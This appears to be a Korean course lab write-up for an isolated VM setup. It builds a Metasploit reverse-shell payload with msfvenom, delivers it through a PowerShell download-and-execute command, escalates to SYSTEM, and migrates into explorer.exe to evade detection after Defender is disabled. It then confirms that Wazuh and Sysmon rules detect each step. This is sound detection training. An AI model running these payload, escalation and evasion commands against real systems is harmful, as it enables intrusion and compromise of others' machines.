# Week 6 — Metasploit 취약점 익스플로잇 & 권한 상승 실습

> **목표**: Meterpreter 세션 수립 → SYSTEM 권한 상승 → Process Migration (T1055)  
> **환경**: Kali (192.168.190.130) → Windows 10 (192.168.190.131)  
> **MITRE ATT&CK**: T1059.001, T1055.001

---

## 환경 구성

| VM | OS | IP | 역할 |
|----|----|----|------|
| Kali Linux | Debian | 192.168.190.130 | 공격자 |
| Windows 10 22H2 | Windows 10 | 192.168.190.131 | 피해자 (Sysmon 설치) |
| Rocky Linux 9 | RHEL 9 | 192.168.190.128 | Wazuh Manager |

---

## Phase 1 — 사전 준비

### 1-1. Kali — Metasploit DB 연결

```bash
sudo service postgresql start
sudo msfdb init        # 최초 1회만
msfconsole -q
```

```
msf > db_status
# [*] Connected to msf. Connection type: postgresql
```

### 1-2. Kali — 워크스페이스 생성

```
msf > workspace -a week6
msf > workspace week6
```

### 1-3. Windows 10 — Defender 비활성화

> ⚠️ 실습 환경 전용. 실제 운영 환경에서 절대 수행 금지.

자세한 절차는 [Troubleshooting — Defender 비활성화](#troubleshooting) 문서 참고.

---

## Phase 2 — Payload 생성 및 리스너 설정

### 2-1. Payload 생성 (Kali)

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.190.130 \
  LPORT=4444 \
  -f exe -o /var/www/html/payload.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows
Payload size: 354 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/payload.exe
```

| 옵션 | 설명 |
|------|------|
| `-p windows/x64/meterpreter/reverse_tcp` | 64비트 Windows용 Meterpreter, 역방향 연결 |
| `LHOST` | 공격자 IP — 피해자가 연결할 목적지 |
| `LPORT` | 리스너 포트 |
| `-f exe` | Windows 실행파일 형식 |

### 2-2. HTTP 서버로 파일 공유 (Kali)

```bash
sudo python3 -m http.server 80 -d /var/www/html
```

### 2-3. 리스너 설정 (Kali msfconsole)

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.190.130
set LPORT 4444
run -j
```

```
[*] Started reverse TCP handler on 192.168.190.130:4444
```

---

## Phase 3 — Payload 전달 및 세션 수립

### 3-1. Payload 다운로드 및 실행 (Windows 10)

```powershell
# 관리자 PowerShell에서
New-Item -ItemType Directory -Path C:\Temp -Force
(New-Object Net.WebClient).DownloadFile('http://192.168.190.130/payload.exe','C:\Temp\payload.exe')
& "C:\Temp\payload.exe"
```

### 3-2. 세션 확인 (Kali)

```
[*] Sending stage (248902 bytes) to 192.168.190.131
[*] Meterpreter session 1 opened (192.168.190.130:4444 -> 192.168.190.131:49818)
```

```
sessions -i 1
```

---

## Phase 4 — 정찰

```
meterpreter > sysinfo
```

```
Computer        : DESKTOP-5408CBA
OS              : Windows 10 22H2+ (10.0 Build 19045)
Architecture    : x64
System Language : ko_KR
Domain          : WORKGROUP
Meterpreter     : x86/windows
```

```
meterpreter > getuid
Server username: DESKTOP-5408CBA\yhc

meterpreter > getpid
Current pid: 10572
```

---

## Phase 5 — 권한 상승 (T1055 사전)

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> **technique 1 — Named Pipe Impersonation**: 서비스 프로세스가 named pipe에 연결할 때 토큰을 가로채 SYSTEM 권한으로 상승하는 기법. 별도 취약점 없이 기본 Windows 메커니즘을 악용.

---

## Phase 6 — Process Migration (T1055.001)

### 목적

`payload.exe`는 이름부터 수상하고 디스크에 존재해 AV/EDR에 탐지되기 쉽다.  
정상 프로세스(`explorer.exe`)로 Meterpreter를 이식해 은닉한다.

### 내부 동작

```
OpenProcess(PROCESS_ALL_ACCESS, target_pid)
  → VirtualAllocEx(target, shellcode_size)
  → WriteProcessMemory(target, shellcode)
  → CreateRemoteThread(target, shellcode_addr)   ← Sysmon EID 8 발생
```

### 실행

```
meterpreter > ps
# explorer.exe PID 확인

meterpreter > migrate -N explorer.exe
[*] Migrating from 10572 to 5388...
[*] Migration completed successfully.

meterpreter > getpid
Current pid: 5388

meterpreter > getuid
Server username: DESKTOP-5408CBA\yhc
```

> migrate 후 SYSTEM → 일반 사용자 권한으로 낮아지는 것은 정상.  
> explorer.exe가 일반 사용자 권한으로 실행되기 때문.

---

## Phase 7 — Wazuh 탐지 확인

### 룰 적용 (Rocky Linux)

```bash
# 룰 파일 편집
docker exec -it single-node-wazuh.manager-1 bash
vi /var/ossec/etc/rules/local_rules.xml
# <group name="local,soc-lab"> ... </group> 형식 필수

# 재시작
docker exec single-node-wazuh.manager-1 /var/ossec/bin/wazuh-control restart
```

### 탐지 확인

```bash
docker exec single-node-wazuh.manager-1 \
  grep "100020\|100021\|100022" /var/ossec/logs/alerts/alerts.json | \
  python3 -m json.tool | head -60
```

### 기대 Alert

| Rule ID | Level | 탐지 내용 |
|---------|-------|-----------|
| 100020 | 14 | CreateRemoteThread (Sysmon EID 8) — migrate 탐지 |
| 100021 | 13 | ProcessAccess 위험 권한 (Sysmon EID 10) |
| 100031 | 14 | PowerShell download cradle (payload 다운로드 시) |

---

## 전체 공격 흐름 요약

```
[Kali]                              [Windows 10]
  |                                      |
  |-- msfvenom 생성 payload.exe          |
  |-- HTTP 서버 (port 80) 실행           |
  |-- msfconsole 리스너 (port 4444) 대기 |
  |                                      |
  |                    payload.exe 실행 --|
  |<-- Meterpreter 역방향 연결 ----------|
  |                                      |
  |-- getsystem → NT AUTHORITY\SYSTEM   |
  |-- migrate -N explorer.exe            |
  |   (CreateRemoteThread → EID 8)      |
  |                                      |
[Wazuh] rule 100020 발화 (level 14)
```

---

## MITRE ATT&CK 매핑

| 기법 | ID | 탐지 룰 |
|------|----|---------|
| Command and Scripting Interpreter: PowerShell | T1059.001 | 100031 |
| Process Injection: Remote Thread | T1055.001 | 100020 |
| Valid Accounts / Privilege Escalation | T1078 | — |
